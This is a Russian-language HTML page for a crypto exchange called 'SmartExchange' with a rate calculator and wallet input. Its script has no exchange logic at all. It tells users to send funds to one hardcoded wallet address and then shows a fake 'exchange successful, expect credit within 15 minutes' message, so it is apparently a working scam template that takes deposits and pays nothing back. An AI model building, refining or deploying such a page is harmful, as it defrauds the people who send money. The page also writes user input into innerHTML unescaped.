<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SmartExchange</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('background.jpg');
      background-size: cover;
      background-position: center;
      color: white;
    }

    .exchange-box {
      background-color: rgba(0, 0, 0, 0.85);
      border-radius: 20px;
      padding: 30px;
      width: 100%;
      max-width: 420px;
      margin: 80px auto 40px;
      box-shadow: 0 0 20px #00ffc3;
      text-align: center;
    }

    .exchange-title {
      font-size: 28px;
      margin-bottom: 20px;
      color: #ffffff;
    }

    .input-group {
      margin-bottom: 15px;
      text-align: left;
    }

    .input-group label {
      font-weight: bold;
      display: flex;
      align-items: center;
      margin-bottom: 5px;
    }

    .icon {
      width: 20px;
      height: 20px;
      margin-right: 8px;
    }

    .custom-input,
    .custom-select {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: none;
      font-size: 16px;
      background-color: #1e1e1e;
      color: white;
    }

    .custom-input::placeholder {
      color: #aaaaaa;
    }

    .main-btn {
      background-color: #00cc66;
      color: white;
      border: none;
      padding: 12px 16px;
      font-size: 16px;
      border-radius: 12px;
      cursor: pointer;
      margin-top: 15px;
      width: 100%;
    }

    .main-btn:hover {
      background-color: #00a653;
    }

    .result {
      margin: 15px 0;
      font-size: 18px;
      font-weight: bold;
      color: #ffffff;
    }

    .support {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: #0077ff;
      color: white;
      padding: 12px 16px;
      border-radius: 25px;
      text-decoration: none;
      font-weight: bold;
      box-shadow: 0 0 10px #0077ff;
    }

    .modal {
      display: none;
      position: fixed;
      z-index: 10;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      overflow: auto;
      background-color: rgba(0,0,0,0.8);
    }

    .modal-content {
      background-color: #222;
      color: white;
      margin: 15% auto;
      padding: 20px;
      border-radius: 15px;
      width: 90%;
      max-width: 400px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="exchange-box">
    <h1 class="exchange-title">SmartExchange</h1>

    <div class="input-group">
      <label for="from"><img src="icons/usdt.png" alt="USDT" class="icon"> Вы отдаёте:</label>
      <select id="from" class="custom-select">
        <option value="USDT">USDT</option>
        <option value="BTC">BTC</option>
        <option value="ETH">ETH</option>
        <option value="XRP">XRP</option>
        <option value="BNB">BNB</option>
      </select>
    </div>

    <div class="input-group">
      <label for="amount"><img src="icons/calculator.png" alt="Amount" class="icon"> Сколько:</label>
      <input type="number" id="amount" placeholder="Введите сумму" class="custom-input">
    </div>

    <div class="input-group">
      <label for="to"><img src="icons/eth.png" alt="To" class="icon"> Вы получаете:</label>
      <select id="to" class="custom-select">
        <option value="XRP">XRP</option>
        <option value="USDT">USDT</option>
        <option value="BTC">BTC</option>
        <option value="ETH">ETH</option>
        <option value="BNB">BNB</option>
      </select>
    </div>

    <button onclick="calculate()" class="main-btn">Рассчитать</button>

    <div class="result" id="output">Вы получите: 0</div>

    <label for="userWallet">Ваш кошелёк для получения:</label>
    <input type="text" id="userWallet" placeholder="Вставьте адрес кошелька" class="custom-input">

    <button onclick="showConfirm()" class="main-btn">Обменять</button>
  </div>

  <a class="support" href="https://t.me/SmartExchangeSup" target="_blank">Support</a>

  <!-- Modal 1 -->
  <div id="confirmModal" class="modal">
    <div class="modal-content">
      <p><b>Подтвердите обмен:</b></p>
      <p id="exchangeDetails"></p>
      <p><b>Отправьте средства на:</b></p>
      <p style="word-break: break-all;">TU9bqAtsMzcB3PW6cg1hF4j2gFdVV8sRD9</p>
      <button onclick="confirmExchange()" class="main-btn">Совершить обмен</button>
    </div>
  </div>

  <!-- Modal 2 -->
  <div id="successModal" class="modal">
    <div class="modal-content">
      <p>Заявка на обмен успешна ✅</p>
      <p>Ожидайте начисление в течение 15 минут.</p>
    </div>
  </div>

  <script>
    let latestResult = 0;

    function calculate() {
      const from = document.getElementById("from").value;
      const to = document.getElementById("to").value;
      const amount = parseFloat(document.getElementById("amount").value);
      let rate = 1;

      if (from === "USDT" && to === "XRP") rate = 2.00;
      if (from === "BTC" && to === "USDT") rate = 106723;
      if (from === "ETH" && to === "USDT") rate = 2667.32;
      if (from === "XRP" && to === "USDT") rate = 0.38;
      if (from === "USDT" && to === "BNB") rate = 627.77;

      latestResult = amount * rate;
      document.getElementById("output").innerText = "Вы получите: " + latestResult.toFixed(2);
    }

    function showConfirm() {
      const from = document.getElementById("from").value;
      const to = document.getElementById("to").value;
      const amount = document.getElementById("amount").value;
      const wallet = document.getElementById("userWallet").value;

      if (!amount || !wallet) {
        alert("Введите сумму и кошелёк!");
        return;
      }

      const details = `Вы отдаёте: ${amount} ${from}, получаете: ${latestResult.toFixed(2)} ${to}<br>Кошелёк для получения: ${wallet}`;
      document.getElementById("exchangeDetails").innerHTML = details;
      document.getElementById("confirmModal").style.display = "block";
    }

    function confirmExchange() {
      document.getElementById("confirmModal").style.display = "none";
      document.getElementById("successModal").style.display = "block";
      setTimeout(() => {
        document.getElementById("successModal").style.display = "none";
      }, 5000);
    }

    window.onclick = function(event) {
      if (event.target.classList.contains('modal')) {
        document.getElementById("confirmModal").style.display = "none";
        document.getElementById("successModal").style.display = "none";
      }
    }
  </script>
</body>
</html>
